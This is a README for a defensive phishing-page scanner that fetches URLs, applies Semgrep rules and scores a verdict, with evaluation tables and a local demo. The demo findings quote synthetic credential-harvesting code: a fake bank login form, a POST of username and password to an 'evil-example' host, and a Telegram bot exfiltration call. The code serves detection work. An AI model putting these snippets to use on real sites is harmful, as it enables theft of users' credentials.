# Brain: payload inspection and decision engine (Member 2)

Takes an event in the team's shared contract, fetches what the URL serves, scans it with Semgrep and fills in the verdict fields.

| In (from Member 1) | Out (to Member 3) |
|---|---|
| `action_status: "PENDING"` | `semgrep_detected`, `confidence_score`, `evidence`, and `action_status` set to `VERIFIED`, `REJECTED` or `FETCH_FAILED` |

All other fields pass through unchanged.

## Setup

Install Semgrep in its own environment: it pins dependency versions that conflict with FastAPI's.

```sh
# app
python -m venv .venv
.venv/Scripts/pip install -r requirements.txt      # Linux/macOS: .venv/bin/pip

# semgrep, separately
pipx install semgrep                               # or a second venv
```

If `semgrep` is not on `PATH`, set `SEMGREP_BIN` to the executable. On Windows, create the Semgrep venv in a short path (for example `C:\sg`); the install fails on long paths.

## Use

```sh
# one URL
python -m brain.pipeline https://suspicious.example/login

# an event file in the shared contract, with the full findings list
python -m brain.pipeline --event event.json --findings

# HTTP service
uvicorn brain.service:app --port 8002
curl -X POST localhost:8002/scan -H "content-type: application/json" \
  -d '{"event_id":"evt-1","target_url":"https://suspicious.example/","timestamp":"2026-10-09T11:00:00Z"}'
```

`POST /scan` returns the event plus a `findings` array (rule, category, weight, file, line, snippet), which is outside the shared contract and meant for the abuse notice.

From Python:

```python
from brain.pipeline import process_event
event, findings = process_event(event)
```

## Demo sites

```sh
python -m http.server 8765 --bind 127.0.0.1 --directory demo-sites
BRAIN_ALLOW_PRIVATE=1 python -m brain.pipeline http://127.0.0.1:8765/phish/    # VERIFIED, 0.95
BRAIN_ALLOW_PRIVATE=1 python -m brain.pipeline http://127.0.0.1:8765/benign/   # REJECTED, 0.0
```

## Settings

| Variable | Default | Meaning |
|---|---|---|
| `SEMGREP_BIN` | `semgrep` on `PATH` | Path to the Semgrep executable |
| `BRAIN_THRESHOLD` | `0.6` | Minimum confidence for `VERIFIED` |
| `BRAIN_ALLOW_PRIVATE` | unset | Set to `1` to allow localhost and private addresses (local demo only) |

## How the verdict is made

1. **Fetch** (`fetcher.py`): plain HTTP GET, never rendered or executed. 10-second timeout, 3 redirects, 2 MB cap, text only. Inline scripts are split into `inline_N.js`, external ones fetched as `ext_N.js`. Private and loopback addresses are refused.
2. **Scan** (`scan.py`): `semgrep-rules/phishing.yaml`. Findings marked `cross_origin_only` are dropped when the URL they matched is on the page's own site.
3. **Decide** (`decide.py`): confidence is `1 − ∏(1 − weight)` over the distinct rules that matched, plus 0.15 if the caller says an independent feed also lists the URL, capped at 0.99.

| Rule | Detects | Weight |
|---|---|---|
| `cross-origin-credential-post` | Requests with a body to a hard-coded external destination | 0.6 |
| `telegram-bot-exfil` | Telegram bot sendMessage/sendDocument URLs | 0.7 |
| `fake-login-form` | Password forms posting to an absolute URL on another site | 0.6 |
| `obfuscated-loader` | Decoded code execution or document writes | 0.4 |
| `obfuscated-redirect` | Redirects to decoded destinations | 0.3 |
| `shell-dropper` | Download, chmod and shell execution sequences | 0.7 |
| `decoded-credential-request` | A password value sent to an atob-decoded URL, including concatenated window fetch/atob aliases | 0.6 |
| `escaped-remote-script` | document.write of a percent-encoded remote script tag | 0.4 |

The new rules are in `semgrep-rules/obfuscation.yaml`. The decoded-request rule
requires a password-like selector and the same destination variable used by the
request. It handles the direct request and alias patterns in the fixtures; it
does not decode arbitrary JavaScript or follow every possible obfuscation.
Escaped remote script injection combines with `obfuscated-loader` for 0.64;
ordinary escaped markup stays at 0.4 and is rejected at the default threshold.

## Tests and evaluation

```sh
python -m pytest tests -q        # includes real Semgrep scans; takes several minutes
python -m brain.evaluate         # rules against a regex baseline on samples/
```

Before adding the two rules (13 hand-written samples):

| Detector | Detection rate | False-positive rate |
|---|---|---|
| Semgrep rules | 71% (5 of 7) | 0% (0 of 6) |
| Regex baseline | 71% (5 of 7) | 100% (6 of 6) |

After adding the two rules and two benign samples (15 samples):

| Detector | Detection rate | False-positive rate |
|---|---|---|
| Semgrep rules | 100% (7 of 7) | 0% (0 of 8) |
| Regex baseline | 71% (5 of 7) | 88% (7 of 8) |

| Label | Sample | Semgrep score before | Semgrep score after | Regex flag |
|---|---|---|---|---|
| malicious | cred-post | 0.6 | 0.6 | yes |
| malicious | dropper | 0.7 | 0.7 | yes |
| malicious | evasive | 0.0 | 0.6 | no |
| malicious | fake-form | 0.6 | 0.6 | yes |
| malicious | obfuscated-eval | 0.4 | 0.64 | yes |
| malicious | redirect | 0.72 | 0.72 | yes |
| malicious | telegram | 0.7 | 0.7 | no |
| benign | analytics | 0.0 | 0.0 | yes |
| benign | base64-image | 0.0 | 0.0 | yes |
| benign | install-script | 0.0 | 0.0 | yes |
| benign | own-login | 0.0 | 0.0 | yes |
| benign | search | 0.0 | 0.0 | yes |
| benign | sso-form | 0.0 | 0.0 | yes |
| benign | decoded-request (new) | — | 0.0 | yes |
| benign | escaped-markup (new) | — | 0.4 | no |

The samples are synthetic and few, so treat this as a sanity check rather than
a benchmark. The full suite passed before (`7 passed, 1 warning in 71.81s`) and
after (`13 passed, 1 warning in 195.34s`). The after run includes an API-key test
added concurrently in the shared workspace as well as the five new rule cases.
The warning is an existing Starlette/httpx deprecation; no dependency was added
to suppress it. The new tests cover both formerly missed samples, the benign
counterexamples, and direct fetch with destination variable binding. No existing
test or assertion was changed. A new benign test initially expected zero findings;
it was corrected to require zero *new-rule* matches and a score below 0.6 because
the existing loader rule deliberately notices escaped document writes at 0.4.

## Guild agent

[Verifier](../agents/verifier/README.md) builds locally using the existing Guild
scaffold. Guild CLI login is valid; MCP is unavailable. Its default export reviews
supplied scanner results and sources without tools. A separate workflow factory
is ready for integration bindings, but no public scanner URL was supplied, so
that workflow has not been uploaded or tested in Guild. Feed lookup, capture-text
retrieval and event persistence still need real integration bindings.

## Verified HTTP demo

Started uvicorn on `127.0.0.1:8002` and Python's static HTTP server on
`127.0.0.1:8765` with `BRAIN_ALLOW_PRIVATE=1` and `SEMGREP_BIN` set, then sent
real HTTP `POST /scan` requests. Both returned HTTP 200: phishing was VERIFIED
at 0.95 and benign was REJECTED at 0.0. Full responses follow.

```json
{
  "phish": {
    "event_id": "evt-demo-phish",
    "target_url": "http://127.0.0.1:8765/phish/",
    "timestamp": "2026-10-09T11:00:00Z",
    "semgrep_detected": true,
    "confidence_score": 0.95,
    "evidence": "Semgrep rule `telegram-bot-exfil` matched ext_0.js line 12: fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=0&text=${user}`); (also matched: cross-origin-credential-post, fake-login-form)",
    "action_status": "VERIFIED",
    "proof_url": "",
    "findings": [
      {
        "rule": "telegram-bot-exfil",
        "category": "credential_harvester",
        "weight": 0.7,
        "file": "ext_0.js",
        "line": 12,
        "end_line": 12,
        "snippet": "fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=0&text=${user}`);"
      },
      {
        "rule": "cross-origin-credential-post",
        "category": "credential_harvester",
        "weight": 0.6,
        "file": "ext_0.js",
        "line": 7,
        "end_line": 10,
        "snippet": "await fetch(\"https://collector.evil-example.net/log\", {\n    method: \"POST\",\n    body: JSON.stringify({ user, pass }),\n  });"
      },
      {
        "rule": "fake-login-form",
        "category": "credential_harvester",
        "weight": 0.6,
        "file": "page.html",
        "line": 16,
        "end_line": 20,
        "snippet": "<form id=\"login\" method=\"post\" action=\"https://harvest.evil-example.net/save.php\">\n    <h1>Acme Bank</h1>\n    <p>Your session expired. Sign in to verify your account.</p>\n    <input id=\"email\" type=\"email\" name=\"email\" placeholder=\"Email\">\n    <input id=\"password\" type=\"password\" name=\"password\" placeholder=\"Password\">"
      }
    ]
  },
  "benign": {
    "event_id": "evt-demo-benign",
    "target_url": "http://127.0.0.1:8765/benign/",
    "timestamp": "2026-10-09T11:00:00Z",
    "semgrep_detected": false,
    "confidence_score": 0.0,
    "evidence": "No Semgrep rule matched",
    "action_status": "REJECTED",
    "proof_url": "",
    "findings": []
  }
}
```

## Safety

The fetcher talks to hostile servers. Run it in WSL or a container, never open a capture in a browser, and keep `BRAIN_ALLOW_PRIVATE` unset anywhere but local demos.
